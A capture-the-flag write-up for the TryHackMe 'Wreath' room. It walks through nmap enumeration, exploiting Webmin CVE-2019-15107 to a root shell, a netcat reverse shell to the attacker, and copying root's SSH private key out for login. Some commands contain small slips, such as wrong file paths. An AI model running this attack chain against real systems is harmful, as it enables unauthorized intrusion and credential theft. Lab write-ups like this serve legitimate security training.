# TryHackMe - Wreath

[Room link](https://tryhackme.com/room/wreath)

--- 

 ## Task 1 - 4
  
**Just read, understand contents and complete**

--- 

## Task 5

Enumeration 

```bash
$ sudo nmap -sS -p0-14999 -oN nmap-0-to-14999.txt <target_ip>
[...]
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
10000/tcp open  snet-sensor-mgmt

$ sudo nmap -sS -F -O -oN nmap-os.txt <target_ip>
[...]
Aggressive OS guesses: Linux 3.10 - 3.13 (90%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Adtran 424RG FTTH gateway (86%), Linux 2.6.32 (86%)
No exact OS matches for host (test conditions non-ideal).

# Check OS (aggressive scan)
$ sudo nmap -sS -A nmap-os.txt <target_ip>
[...]
80/tcp    open   http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)

# Check server web redirection
$ curl http://<target_ip>/                                                                          
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="https://thomaswreath.thm">here</a>.</p>
</body></html>

# Update /etc/hosts
$ echo "<target_ip> thomaswreath.thm" | sudo tee -a /etc/hosts 

# Reload the webpage. Check Thomas' mobile phone number
$ curl --insecure https://thomaswreath.thm/ | grep '[0-9]\{3\}[ -]\?[0-9]\{3\}[ -]\?[0-9]\{4\}'

# Find highest open port version
$ sudo nmap -sV -p10000 <target_ip>

# Check CVE exploit about MiniServ
$ searchsploit -w webmin 1.890
------------------------------------------------------------------------------------------------------------------------------------ --------------------------------------------
 Exploit Title                                                                                                                      |  URL
------------------------------------------------------------------------------------------------------------------------------------ --------------------------------------------
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                                                       | https://www.exploit-db.com/exploits/47330
------------------------------------------------------------------------------------------------------------------------------------ --------------------------------------------
$ curl https://www.exploit-db.com/exploits/47330 | grep -i CVE
```

1. How many of the first 15000 ports are open on the target?

**4**

2. What OS does Nmap think is running?

**CentOS**

3. Open the IP in your browser -- what site does the server try to redirect you to?

**https://thomaswreath.thm/**

4. You will have noticed that the site failed to resolve. Looks like Thomas forgot to set up the DNS!

**Update /etc/hosts**

5. Read through the text on the page. What is Thomas' mobile phone number?

**447821548812**

6. Look back at your service scan results: what server version does Nmap detect as running here?

**MiniServ 1.890 (Webmin httpd)**

7. What is the CVE number for this exploit?

**CVE-2019-15107**

---

## Task 6

```bash
# After do instructions run exploit
$ $ ./CVE-2019-15107.py <target_ip>
[...]
$ whoami
root

# Shell stabilization (on exploit pseudoshell)
$ shell 
[*] Starting the reverse shell process
[*] For UNIX targets only!
[*] Use 'exit' to return to the pseudoshell at any time
Please enter the IP address for the shell: <attacker_ip>
Please enter the port number for the shell: <port_listener>

[*] Start a netcat listener in a new window (nc -lvnp 12345) then press enter.

# On the nc listener
sh-4.4# 

# Check root's hash
sh-4.4# cat/etc/passwd

# Copy content of /root/.ssh/id_rsa
sh-4.4# cat /etc/.ssh/id_rsa #Copy the content
[...]
# On the attacker machine
$ echo "<id_rsa_content>" > id_rsa_wreath
$ chmod 600 id_rsa_wreath

# Connect us to the target machine
$ ssh -i id_rsa_wreath root@<target_ip>
$ whoami
root
```

1. Run the exploit and obtain a pseudoshell on the target!

**Just execut the python exploit**

2. Which user was the server running as?

**root**

3. What is the root user's password hash?

**Check content of /etc/passwd**

4. What is the full path to this file?

**/root/.ssh/id_rsa**

---

## Task 7
